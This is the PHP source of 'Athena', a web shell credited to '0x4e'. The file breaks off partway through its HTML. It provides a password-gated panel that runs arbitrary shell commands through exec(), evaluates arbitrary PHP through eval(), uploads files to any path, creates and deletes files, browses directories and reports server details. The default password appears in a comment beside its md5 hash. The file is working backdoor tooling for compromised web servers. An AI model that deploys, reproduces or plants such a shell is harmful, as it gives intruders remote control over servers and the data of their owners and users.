<?php
    /**
    MIT License

    Copyright (c) 2021 0x4e

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions: 

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

    */
    session_start();

    define( "RANDOM_ID", md5( rand() ) );
    define( "SERVER_NAME", $_SERVER['SERVER_NAME'] );
	define( "SERVER_IP_PORT", $_SERVER['SERVER_ADDR'].":".$_SERVER['SERVER_PORT'] );
	define( "SERVER_SOFTWARE", $_SERVER['SERVER_SOFTWARE'] );

    $_AUTH              = 1;
    $_ERROR_REPORTING   = 1;  
    // You can even use md5('yourpassword') for setting the password
    $_PASSWORD          = "0454aa97682235df3ed1a3456bc86e62"; // athena
    $_MODE              = "shell";

    if ( $_ERROR_REPORTING ){
        error_reporting( E_ALL&~E_NOTICE );
    } else{
        error_reporting( 0 );
    }

    if ( !empty( $_GET[ 'mode' ] ) ) {
        $_MODE = $_GET[ 'mode' ];
    } elseif ( !empty($_POST['mode'] ) ) {
        $_MODE = $_POST['mode'];
    } else {
        $_MODE = "shell";
    }
    
    function exec_command( $_CMD ){
        exec( $_CMD , $_ARR );
        return implode( ' ' , $_ARR );
    }

    /** Thanks Stackoverflow <https://stackoverflow.com/questions/2510434/format-bytes-to-kilobytes-megabytes-gigabytes#2510459> */
    function format_bytes( $_B, $_P = 2 ) { 
        $_U = array( 'B', 'KB', 'MB', 'GB', 'TB' ); 
    
        $_B = max( $_B, 0 ); 
        $_P = floor( ( $_B ? log( $_B ) : 0) / log( 1024 ) ); 
        $_P = min( $_P, count( $_U ) - 1); 
        $_B /= pow( 1024, $_P );
        return round( $_B, $_P ) . ' ' . $_U[ $_P ]; 
    } 

    /** Thanks W3Schools <https://www.w3schools.com/howto/howto_js_snackbar.asp> */
    function show_toast( $_M ){
        return '
        <script id=". RANDOM_ID .">window.onload = function(){var x = document.getElementById("snackbar");x.innerHTML="'.$_M.'";x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }</script>
        ';
    }

    function edit_file ( $_F , $_C ){
        $_FP = fopen( $_F, 'w' );
        if ( !$_FP){
            echo show_toast( "There was an error opening the file." );
        } else{
            fwrite( $_FP, $_C );
            fclose( $_FP );
            echo show_toast( "Edits was saved!" );
        }
    }

    function remove_file( $_F )
    {
        if ( file_exists ( $_F ) )
        {
            if ( unlink ( $_F ) ){
                echo show_toast( "File ". $_F ." was deleted." );
            } else{
                echo show_toast( "Failed to delete the file ". $_F );
            }
        } else{
            echo show_toast( "The file ". $_F ." does not exist.");
        }
    }
    
    function create_file( $_F ){
        $_FP = fopen( $_SERVER['DOCUMENT_ROOT'].'/'.$_F, "w" );
        if ($_FP)
        {
            fclose( $_FP );
            echo show_toast( "The file ". $_F ." was created!");
        } else{
            echo show_toast( "There was an error creating the file ". $_F );
        }
    }

    function get_files( $_D )
    {
        $_F = glob( $_D."*/*" );
        foreach( $_F as $_FL ){
            echo '
                <tr>
                    <td>';
                    if ( is_dir( $_FL ) ){
                        echo '
                        <a href="?dir='. $_FL .'" style="color:#00d25b;">
                            '. $_FL .'
                        </td>';
                    }
                    else{
                        echo $_FL;
                    }
                    echo '</td>
                    <td>'. format_bytes( filesize( $_FL ) ) .'</td>
                    <td>'. date("H.i/d.m.Y", filemtime($_FL)) .'</td>
                    ';
                    if ( is_dir( $_FL ) ){
                        echo '
                        <td class="is_flex" style="align-items: center;justify-content: center;">
                            <a href="?action=delete_dir&file=1&dir_delete='. $_FL .'">
                                <button class="is_spaced is_rounded is_button is_button_mod is_info">
                                    <svg class="is_info_icon" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zm2.46-7.12l1.41-1.41L12 12.59l2.12-2.12 1.41 1.41L13.41 14l2.12 2.12-1.41 1.41L12 15.41l-2.12 2.12-1.41-1.41L10.59 14l-2.13-2.12zM15.5 4l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                                </button>
                            </a>
                        </td>';
                    } else{
                        echo '
                        <td class="is_flex" style="align-items: center;justify-content: center;">
                            <a href="?action=edit&file='. $_FL .'">
                                <button class="is_spaced is_rounded is_button is_button_mod is_info">
                                    <svg class="is_info_icon" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>
                                </button>
                            </a>
                            <a href="?action=delete&file='. $_FL .'">
                                <button class="is_spaced is_rounded is_button is_button_mod is_info">
                                    <svg class="is_info_icon" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zm2.46-7.12l1.41-1.41L12 12.59l2.12-2.12 1.41 1.41L13.41 14l2.12 2.12-1.41 1.41L12 15.41l-2.12 2.12-1.41-1.41L10.59 14l-2.13-2.12zM15.5 4l-1-1h-5l-1 1H5v2h14V4z"/></svg>
                                </button>
                            </a>
                        </td>
                        ';
                    }
                echo '</tr>
            ';
        }
    }
    /** Thanks Gist <https://gist.github.com/Balamir/4a19b3b0a4074ff113a08a92908302e2> */
	function get_os(){
		
		$_U		= $_SERVER['HTTP_USER_AGENT'];
		$_O		= "";
		
		$_OA =   array(
			'/windows nt 10/i'      =>  'Windows 10',
			'/windows nt 6.3/i'     =>  'Windows 8.1',
			'/windows nt 6.2/i'     =>  'Windows 8',
			'/windows nt 6.1/i'     =>  'Windows 7',
			'/windows nt 6.0/i'     =>  'Windows Vista',
			'/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
			'/windows nt 5.1/i'     =>  'Windows XP',
			'/windows xp/i'         =>  'Windows XP',
			'/windows nt 5.0/i'     =>  'Windows 2000',
			'/windows me/i'         =>  'Windows ME',
			'/win98/i'              =>  'Windows 98',
			'/win95/i'              =>  'Windows 95',
			'/win16/i'              =>  'Windows 3.11',
			'/macintosh|mac os x/i' =>  'Mac OS X',
			'/mac_powerpc/i'        =>  'Mac OS 9',
			'/linux/i'              =>  'Linux',
			'/ubuntu/i'             =>  'Ubuntu',
			'/iphone/i'             =>  'iPhone',
			'/ipod/i'               =>  'iPod',
			'/ipad/i'               =>  'iPad',
			'/android/i'            =>  'Android',
			'/blackberry/i'         =>  'BlackBerry',
			'/webos/i'              =>  'Mobile'
		);

		foreach ( $_OA as $_R => $_V ) { 
			if ( preg_match($_R, $_U ) ) {
				$_O = $_V;
			}
		}   
		return $_O;
	}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=0" />
    <meta http-equiv='pragma' content='no-cache'>
    <title>
        Athena ~ <?php echo get_current_user() . " @ " . $_SERVER[ 'SERVER_NAME' ]; ?>
    </title>
    <style type="text/css">
        *,body,html{margin:0;padding:0;font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;box-sizing:border-box}a{text-decoration:none}body{height:100vh;overflow:auto;margin:0;padding:0;background:#191c24}textarea{resize:none}.is_flex{height:100%;display:-webkit-flex;display:flex}.mr-auto{margin-right:auto!important}.ml-auto{margin-left:auto!important}.is_spaced{margin:0 0.4rem 0 0}#error_directory,#error_message{color:#fc424a}.is_bold{font-weight:bold}.width_480{width:480px}.width_100{width:100%}.is_card{align-items:center;justify-content:center;background-color:#0b0d10;border:1px solid rgba(0, 0, 0, 0.125);padding:25px;border-radius:0.25rem}.card_title{color:#fff;font-size:26px;margin-bottom:2rem}.is_field{margin-bottom:1rem}.is_input{outline:none;width:100%;font-size:16px;font-weight:600;border:1px solid #191c24;padding:13px;background-color:#191c24;border-radius:2px;color:#ffffff}.is_input:active,.is_input:hover{border:1px solid #00d25b}.is_button{outline:none;cursor:pointer;font-size:0.9375rem;font-weight:bold;line-height:1;padding:1em 2em;border:1px solid transparent;border-radius:0.1875rem}.is_button_mod{line-height:1.6;display:flex;padding:0.375rem 0.75rem!important;}.is_primary{color:#00d25b;background:#00d25b33;border-color:#00d25b00}.is_primary:hover{background:#00d25b79}.is_warning{color:#ffab00;background:#ffab0033;border-color:#00d25b00}.is_warning:hover{background:#ffab0079}.is_info{color:#8f5fe8;background:#8f5fe833;border-color:#00d25b00}.is_info:hover{background:#8f5fe879}.is_rounded{padding:0!important;width:24px;height:24px;border-radius:50%;align-items:center}.is_container{padding:1em;height:100%}.is_options{margin-top:1em}.is_row_inner{display:block;flex-basis:0;flex-grow:1;flex-shrink:1;padding:0.75rem}.is_icon{line-height:3;text-align:center;width:46px;height:36px;border-radius:7px}.is_svg{fill:#00d25b!important}.is_button_icon{margin-right:0.3rem;fill:#ff8f0a}.is_info_icon{margin-right:0!important;width:22px;height:18px;fill:#8f5fe8!important}.is_table{width:100%;color:#6c7293}.is_table td{font-size:0.875rem;padding:0.9375rem}.is_mini_card{color:#fff;padding:1rem;border-radius:0.25rem;background-color:#12151e;border:1px solid #00000020}.is_label{position:relative;padding-left:2rem;line-height:1.5;color:#fff;margin:0 2rem 0 0}.is_radio{position:absolute;top:0;left:0;margin-left:0;margin-top:0;z-index:1;cursor:pointer;opacity:0}.is_label input[type="radio"]+.radio_input:before{position:absolute;content:"";top:0;left:0;border:solid #00d25b;border-width:2px;width:20px;height:20px;border-radius:50%;-webkit-transition:all;-moz-transition:all;-ms-transition:all;-o-transition:all;transition:all;transition-duration:0s;-webkit-transition-duration:250ms;transition-duration:250ms}.is_label input[type="radio"]:checked+.radio_input:before{background:#00d25b}@media screen and (min-width: 769px), print{.is_row:not(.is_bleed){display:flex}.is_small{flex:0 0 33.33333%;max-width:33.33333%}.is_medium{flex:0 0 66.66667%;max-width:66.66667%}}#snackbar{visibility:hidden;min-width:250px;margin-left:-125px;background:#0b0d10;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px}#snackbar.show{visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s}@-webkit-keyframes fadein{from{bottom:0;opacity:0}to{bottom:30px;opacity:1}}@keyframes fadein{from{bottom:0;opacity:0}to{bottom:30px;opacity:1}}@-webkit-keyframes fadeout{from{bottom:30px;opacity:1}to{bottom:0;opacity:0}}@keyframes fadeout{from{bottom:30px;opacity:1}to{bottom:0;opacity:0}}
    </style>
</head>

<body class="<?php echo RANDOM_ID; ?>">
  
    <div class="is_container">
        <a href="https://4e0x.github.io" style="color:#00d25b;" target="_blank">
            <div class="is_logo" style="display:flex;">
                <svg width="100px" height="40px" viewBox="0 0 175 73" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg">
                    <g id="ATHENA" fill="#FFFFFF">
                      <path d="M41.967 5.711Q41.94 5.738 41.94 5.792L41.94 51.476Q42.912 50.972 43.884 50.396Q44.856 49.82 45.828 49.316L45.828 20.264Q45.828 17.24 45.864 14.18Q45.9 11.12 45.828 7.952Q44.856 7.376 43.902 6.854Q42.948 6.332 42.048 5.684Q41.994 5.684 41.967 5.711ZM61.236 14.792L61.236 25.484Q61.56 25.412 61.866 25.214Q62.172 25.016 62.424 24.836Q64.476 23.684 66.528 22.514Q68.58 21.344 70.524 20.192Q73.872 22.064 77.166 23.972Q80.46 25.88 83.808 27.752L83.808 42.98C83.688 42.98 83.598 42.944 83.538 42.872Q83.448 42.764 83.376 42.764Q82.476 42.26 81.612 41.774Q80.748 41.288 79.92 40.712L79.92 31.424Q79.92 31.1 79.956 30.704Q79.992 30.308 79.92 30.128Q79.848 29.876 79.416 29.714Q78.984 29.552 78.732 29.372Q76.68 28.22 74.682 27.032Q72.684 25.844 70.632 24.62Q68.256 25.988 65.934 27.32Q63.612 28.652 61.236 30.02L61.236 40.712Q60.336 41.288 59.328 41.846Q58.32 42.404 57.348 42.98L57.348 12.524L61.236 14.792ZM19.818 23.918Q16.524 22.028 13.176 20.084Q9.828 22.028 6.552 23.954Q3.276 25.88 0 27.752L0 42.98Q3.276 44.924 6.552 46.814Q9.828 48.704 13.176 50.648Q15.444 49.352 17.766 48.002Q20.088 46.652 22.356 45.356Q21.456 44.78 20.448 44.186Q19.44 43.592 18.468 43.088Q17.316 43.736 16.182 44.402Q15.048 45.068 13.824 45.788Q13.644 45.86 13.446 45.986Q13.248 46.112 13.176 46.112Q13.104 46.112 12.906 45.986Q12.708 45.86 12.636 45.788Q10.368 44.492 8.19 43.25Q6.012 42.008 3.888 40.712L3.888 30.02Q6.264 28.652 8.586 27.284Q10.908 25.916 13.176 24.62Q15.228 25.844 17.28 26.996Q19.332 28.148 21.384 29.372Q21.456 29.408 21.636 29.48Q21.816 29.552 21.996 29.642Q22.176 29.732 22.32 29.84Q22.464 29.948 22.464 30.02Q22.536 30.272 22.5 30.668Q22.464 31.064 22.464 31.316L22.464 40.712Q23.364 41.216 24.228 41.684Q25.092 42.152 25.92 42.656Q26.1 42.728 26.19 42.8Q26.28 42.872 26.46 42.872Q26.28 35.24 26.46 27.752Q23.112 25.808 19.818 23.918ZM165.834 23.918Q162.54 22.028 159.192 20.084Q155.844 22.028 152.568 23.954Q149.292 25.88 146.016 27.752L146.016 42.98Q149.292 44.924 152.568 46.814Q155.844 48.704 159.192 50.648Q161.46 49.352 163.782 48.002Q166.104 46.652 168.372 45.356Q167.472 44.78 166.464 44.186Q165.456 43.592 164.484 43.088Q163.332 43.736 162.198 44.402Q161.064 45.068 159.84 45.788Q159.66 45.86 159.462 45.986Q159.264 46.112 159.192 46.112Q159.12 46.112 158.922 45.986Q158.724 45.86 158.652 45.788Q156.384 44.492 154.206 43.25Q152.028 42.008 149.904 40.712L149.904 30.02Q152.28 28.652 154.602 27.284Q156.924 25.916 159.192 24.62Q161.244 25.844 163.296 26.996Q165.348 28.148 167.4 29.372Q167.472 29.408 167.652 29.48Q167.832 29.552 168.012 29.642Q168.192 29.732 168.336 29.84Q168.48 29.948 168.48 30.02Q168.552 30.272 168.516 30.668Q168.48 31.064 168.48 31.316L168.48 40.712Q169.38 41.216 170.244 41.684Q171.108 42.152 171.936 42.656Q172.116 42.728 172.206 42.8Q172.296 42.872 172.476 42.872Q172.296 35.24 172.476 27.752Q169.128 25.808 165.834 23.918ZM106.704 31.478Q109.98 29.588 113.256 27.644Q110.34 25.916 107.262 24.17Q104.184 22.424 101.16 20.624Q100.764 20.444 100.494 20.282Q100.224 20.12 99.972 20.192Q99.576 20.372 99.162 20.642Q98.748 20.912 98.352 21.164Q95.508 22.784 92.592 24.458Q89.676 26.132 86.904 27.752L86.904 42.98Q90.252 44.852 93.528 46.76Q96.804 48.668 100.08 50.54Q103.428 48.668 106.704 46.796Q109.98 44.924 113.256 42.98L109.368 40.712Q106.992 42.08 104.724 43.412Q102.456 44.744 100.08 46.112Q97.812 44.744 95.49 43.412Q93.168 42.08 90.792 40.712L90.792 30.02Q93.168 28.652 95.49 27.284Q97.812 25.916 100.188 24.62Q101.484 25.34 102.834 26.078Q104.184 26.816 105.48 27.644Q103.212 29.012 100.89 30.344Q98.568 31.676 96.3 33.044Q97.272 33.62 98.226 34.178Q99.18 34.736 100.08 35.312Q103.428 33.368 106.704 31.478ZM129.636 20.552Q133.056 22.496 136.314 24.386Q139.572 26.276 142.92 28.22L142.92 43.448L139.032 41.18L139.032 30.488Q138.456 30.092 137.844 29.786Q137.232 29.48 136.656 29.084Q134.928 28.112 133.2 27.086Q131.472 26.06 129.744 25.088Q127.368 26.384 125.046 27.752Q122.724 29.12 120.348 30.488L120.348 39.776Q120.348 40.1 120.384 40.514Q120.42 40.928 120.348 41.18Q120.348 41.252 119.952 41.45Q119.556 41.648 119.376 41.72Q118.656 42.224 117.918 42.638Q117.18 43.052 116.46 43.448L116.46 20.66Q117.432 21.164 118.404 21.704Q119.376 22.244 120.348 22.82L120.348 25.952Q122.796 24.656 125.082 23.288Q127.368 21.92 129.636 20.552ZM30.672 29.714Q31.68 30.272 32.652 30.848Q34.38 29.804 36.108 28.814Q37.836 27.824 39.564 26.852Q40.14 26.528 40.698 26.186Q41.256 25.844 41.832 25.448Q41.832 24.404 41.868 23.288Q41.904 22.172 41.832 21.02Q38.484 22.892 35.262 24.8Q32.04 26.708 28.764 28.58Q29.664 29.156 30.672 29.714ZM50.472 25.934Q48.204 24.584 45.936 23.288L45.936 27.824Q47.232 28.544 48.546 29.336Q49.86 30.128 51.228 30.848Q52.128 30.272 53.118 29.714Q54.108 29.156 55.008 28.58Q52.74 27.284 50.472 25.934ZM26.46 47.516Q26.28 45.32 26.46 42.98Q25.416 42.476 24.426 41.9Q23.436 41.324 22.464 40.82Q21.492 41.396 20.52 41.9Q19.548 42.404 18.576 42.98Q20.52 44.132 22.464 45.302Q24.408 46.472 26.46 47.516ZM172.476 47.516Q172.296 45.32 172.476 42.98Q171.432 42.476 170.442 41.9Q169.452 41.324 168.48 40.82Q167.508 41.396 166.536 41.9Q165.564 42.404 164.592 42.98Q166.536 44.132 168.48 45.302Q170.424 46.472 172.476 47.516Z" />
                    </g>
                  </svg>
                  <span style="margin:0.54rem 0 0 0.3rem">by 0x4e</span>
            </div>
        </a>
        <?php
            // -------------------- Auth Container
            if ( $_AUTH && !isset( $_SESSION['is_authorized'] ) ):
            
        ?>
        <div class="is_flex" style="height: auto !important;">
            <div class="width_480 is_card mr-auto ml-auto">
                <h3 class="card_title">Auth</h3>
                <form method="POST">
                    <div class="is_field">
                        <input name="auth_password" type="password" class="is_input" required />
                    </div>
                    <div class="is_field">
                        <button type="submit" name="do_auth" class="is_button is_primary">Login</button>
                    </div>
                    <h6 id="error_message"></h6>
                </form>
            </div>
        </div>

        <?php 
            // -------------------- End Auth Container 
            else: 
        ?>

        <div class="is_options">
            <style type="text/css">
                .card_title{font-size:18px!important;margin-bottom:4px!important}.card_sub{color:#6c7293 !important}
            </style>
            <div class="is_row">
                <div class="is_row_inner">
                    <div class="is_card">
                        <div class="is_flex">
                            <div class="width_100">
                                <a href="?mode=shell">
                                    <h3 class="card_title">Shell Commands</h3>
                                </a>
                                <h6 class="card_sub">Exec juicy shell commands</h6>
                            </div>
                            <div class="is_icon">
                                <svg class="is_svg" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M21 3H3c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-9 9H3V5h9v7z"/></svg>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="is_row_inner">
                    <div class="is_card">
                        <div class="is_flex">
                            <div class="width_100">
                                <a href="?mode=php">
                                    <h3 class="card_title">Exec PHP Code</h3>
                                </a>
                                <h6 class="card_sub">Write and exec PHP</h6>
                            </div>
                            <div class="is_icon">
                                <svg class="is_svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" viewBox="0 0 512 512" style="enable-background:new 0 0 512 512;" xml:space="preserve">
                                    <path style="fill:#8F9ED1;" d="M512,256c0,15.485-1.379,30.647-4.012,45.369C486.578,421.115,381.9,512,256,512  c-94.856,0-177.664-51.587-221.884-128.24c-10.794-18.693-19.278-38.87-25.088-60.155C3.135,302.07,0,279.395,0,256  C0,114.615,114.615,0,256,0c116.694,0,215.144,78.075,245.979,184.842C508.5,207.433,512,231.309,512,256z"/>
                                    <g>
                                        <path style="fill:#F2F2F2;" d="M130.173,178.239H35.892L9.028,323.605c5.81,21.285,14.294,41.462,25.088,60.155h8.746   l10.407-56.299h51.806c63.08,0,80.039-56.633,84.104-84.449C193.254,215.207,172.91,178.239,130.173,178.239z M143.851,247.703   c-2.309,15.768-13.96,47.877-49.716,47.877H59.162l15.632-84.605h35.6C145.095,210.975,146.16,231.936,143.851,247.703z"/>
                                        <path style="fill:#F2F2F2;" d="M501.979,184.842c-8.014-4.138-17.565-6.604-28.599-6.604h-94.281L341.117,383.76h44.951   l10.407-56.299h51.806c28.056,0,46.989-11.201,59.705-26.091C510.621,286.647,512,271.485,512,256   C512,231.309,508.5,207.433,501.979,184.842z M487.058,247.703c-2.309,15.768-13.96,47.877-49.727,47.877h-34.962l15.632-84.605   h35.6C488.302,210.975,489.367,231.936,487.058,247.703z"/>
                                        <path style="fill:#F2F2F2;" d="M309.238,178.919c-18.295,0-42.704,0-54.597,0l10.248-55.451h-44.766L182.14,328.984h44.766   l21.843-118.186c8.07,0,18.79,0,28.61,0c18.991,0,31.879,4.07,29.165,21.705c-2.713,17.635-18.313,95.636-18.313,95.636h45.444   c0,0,17.635-86.818,20.348-111.237C356.717,192.484,334.334,178.919,309.238,178.919z"/>
                                    </g></svg>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="is_options">
            <style type="text/css">
                .card_title {
                    font-size: 18px!important;
                    margin-bottom: 1rem!important;
                }
                
                .card_sub {
                    color: #6c7293 !important;
                }
            </style>
            <div class="is_row is_row width_100">
                <div class="is_row_inner is_medium">
                    <div class="is_card">
                        <h3 class="card_title" style="text-transform:uppercase;"><?php echo $_MODE; ?> Mode</h3>
                        <?php 
                            switch( $_MODE ){
                                // -------------------- Shell/Default mode
                                case "shell":
                                    echo '
                                    <div class="is_mini_card is_field">
                                        <h6 class="card_sub">CURRENT DIRECTORY</h6>
                                        <h4>'. getcwd() .'</h4>
                                    </div>
                                    <form method="POST">
                                        <div class="is_field">
                                            <input name="command" class="is_input" placeholder="cd .. && dir" />
                                        </div>
                                        <h6 id="error_message"></h6>
                                    </form>
                                    ';
                                    if ( isset( $_POST[ 'command' ] ) ){
                                        if ( empty( $_POST[ 'command' ] ) ){
                                            echo "<script id=". RANDOM_ID .">window.onload=function(){document.getElementById('error_message').innerHTML = 'Well this does not accept empty commands!';}</script>";
                                        } else{
                                            echo '
                                            <div class="is_mini_card is_field">
                                                <h6 class="card_sub">COMMAND RESULT</h6>
                                                <h4>'. exec_command( $_POST['command'] ) .'</h4>
                                            </div>
                                            ';
                                        }
                                    }
                                break;

                                // -------------------- PHP mode
                                case "php":
                                    echo '
                                    <form method="POST">
                                        <div class="is_field">
                                            <textarea name="php_code" class="is_input" rows="4" placeholder="echo \'hello world\'; "></textarea>
                                        </div>
                                        <div class="is_field">
                                            <button type="submit" name="exec_php" class="is_button is_primary">Execute</button>
                                        </div>
                                        <h6 id="error_message"></h6>
                                    </form>
                                    ';
                                    if ( isset( $_POST['exec_php'] ) ){
                                        if ( empty( $_POST[ 'php_code' ] ) ){
                                            echo "<script id=". RANDOM_ID .">window.onload=function(){document.getElementById('error_message').innerHTML = 'Well this does not accept empty code block!';}</script>";
                                        } else{
                                            echo '
                                            <div class="is_mini_card is_field">
                                                <h6 class="card_sub">PHP CODE RESULT</h6>
                                                <h4>';
                                                @eval( stripslashes( $_POST[ 'php_code' ] ) );
                                            echo '</h4></div>';
                                        }
                                    }
                                break;

                                // -------------------- Upload mode
                                case "upload":
                                    echo '
                                    <form enctype="multipart/form-data" method="POST">
                                        <div class="is_field">
                                            <input name="the_file" type="file" class="is_input"/>
                                        </div>
                                        <div class="is_field">
                                            <input type="text" name="upload_path" class="is_input" placeholder="'. $_SERVER['DOCUMENT_ROOT'] .'" value="'. $_SERVER['DOCUMENT_ROOT'] .'"/>
                                        </div>
                                        <div class="is_field">
                                            <button type="submit" name="upload_file" class="is_button is_primary">Upload</button>
                                        </div>
                                        <h6 id="error_message"></h6>
                                    </form>
                                    ';
                                    if ( isset( $_POST['upload_file'] ) ){
                                        $_FILE_NAME     = $_POST[ 'upload_path' ]."/".$_FILES[ 'the_file' ][ 'name' ];
                                        if ( empty( $_POST[ 'upload_path' ] ) ){
                                            echo "<script id=". RANDOM_ID .">window.onload=function(){document.getElementById('error_message').innerHTML = 'Where do i have to upload the file?';}</script>";
                                        } else{
                                            if ( copy( $_FILES[ 'the_file' ][ 'tmp_name' ]  , $_FILE_NAME ) ) {
                                                echo show_toast( "File was uploaded to ". $_POST[ 'upload_path'] );
                                            } else {
                                                echo '
                                                <div class="is_mini_card is_field">
                                                    <h6 class="card_sub">UPLOAD FAILED</h6>
                                                    <h4>'. print_r($_FILES) .'</h4>
                                                </div>
                                                ';
                                            }
                                        }
                                    }
                                break;

                                // -------------------- Create mode
                                case "create":
                                    echo '
                                    <form method="POST">
                                        <div class="is_field">
                                            <label class="is_label">
                                                <input type="radio" class="is_radio" name="create_type" value="file" />
                                                File
                                                <i class="radio_input"></i>
                                            </label>
                                            <label class="is_label">
                                                <input type="radio" class="is_radio" name="create_type" value="folder" />
                                                Folder
                                                <i class="radio_input"></i>
                                            </label>
                                        </div>
                                        <div class="is_field">
                                            <input type="text" name="create_file_name" class="is_input" placeholder="Name" />
                                        </div>
                                        <div class="is_field">
                                            <button type="submit" name="create_this" class="is_button is_primary">Create</button>
                                        </div>
                                    </form>
                                    ';
                                    
                                    if( isset( $_POST['create_this'] ) ){
                                        if ( !empty( $_POST[ 'create_type' ] ) && !empty( $_POST[ 'create_file_name']  ) ){
                                        switch( $_POST[ 'create_type' ] ){
                                            case "folder":
                                                if ( mkdir( $_SERVER[ 'DOCUMENT_ROOT' ].'/'.$_POST[ 'create_file_name' ] ) ){
                                                    echo show_toast( "Directory ". $_POST[ 'create_file_name']." was created!");
                                                    echo "<script id=". RANDOM_ID .">setTimeout(function(){location.href='./';},3000)</script>";
                                                } else{
                                                    echo show_toast( "There was an error creating the directory.");
                                                    echo "<script id=". RANDOM_ID .">setTimeout(function(){location.href='./';},3000)</script>";
                                                }
                                            break;
                                            
                                            case "file":
                                                if (file_exists( $_SERVER['DOCUMENT_ROOT'].'/'.$_POST['create_file_name'] ) ){
                                                    echo show_toast( "File ". $_POST[ 'create_file_name']." already exists!");
                                                    echo "<script id=". RANDOM_ID .">setTimeout(function(){location.href='./';},3000)</script>";
                                                } else{
                                                    echo create_file( $_POST[ 'create_file_name'] );
                                                }
                                                
                                            break;
                                        }
                                    } else{
                                        echo show_toast( "What's the file/folder name?");
                                    }
                                }
                                break;
                            }
                        ?>
                        
                    </div>
                </div>
                <div class="is_row_inner">
                    <div class="is_card">
                        <h3 class="card_title">Server Info</h3>
                        <table class="is_table">
                            <tr>
                                <td class="is_bold">Server Name</td>
                                <td>
                                    <?php echo SERVER_NAME; ?>
                                </td>
                            </tr>
                            <tr>
                                <td class="is_bold">Server IP, PORT</td>
                                <td>
                                    <?php echo SERVER_IP_PORT; ?>
                                </td>
                            </tr>
                            <tr>
                                <td class="is_bold">Operating System</td>
                                <td>
                                    <?php echo get_os(); ?>
                                </td>
                            </tr>
                            <tr>
                                <td class="is_bold">Server Software</td>
                                <td>
                                    <?php echo SERVER_SOFTWARE; ?>
                                </td>
                            </tr>
                        </table>
                    </div>
                </div>
            </div>
        </div>
        <div class="is_options">
            <div class="is_row is_row width_100">
                <div class="is_row_inner">
                    <div class="is_card">
                        <div class="is_flex">
                            <div class="width_100">
                                <h3 class="card_title">
                                <a href="./">
                                    <svg class="is_info_icon" style="position:relative;top:2px;" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"></path></svg>    
                                </a>
                                File Manager</h3>
                            </div>
                            <div class="is_flex">
                                <a href="?mode=upload">
                                    <button class="is_spaced is_button is_button_mod is_warning">
                                        <svg class="is_button_icon" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm4 18H6V4h7v5h5v11zM8 15.01l1.41 1.41L11 14.84V19h2v-4.16l1.59 1.59L16 15.01 12.01 11z"></path></svg>
                                        Upload
                                    </button>
                                </a>
                                <a href="?mode=create">
                                    <button class="is_spaced is_button is_button_mod is_warning">
                                        <svg class="is_button_icon" xmlns="http://www.w3.org/2000/svg" height="24" viewBox="0 0 24 24" width="24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
                                        Create
                                    </button>
                                </a>
                            </div>
                        </div>
                        <table class="is_table">
                            <thead>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Modified</th>
                                <th>Actions</th>
                            </thead>
                            <tbody style="text-align:center;">
                                <?php
                                
                                if ( !empty( $_GET['dir'] ) ){
                                    get_files( $_GET['dir'] );
                                } else{
                                    get_files( $_SERVER['DOCUMENT_ROOT'] );
                                }

                                ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>      
            
            <div class="is_row is_row width_100">
                <?php 
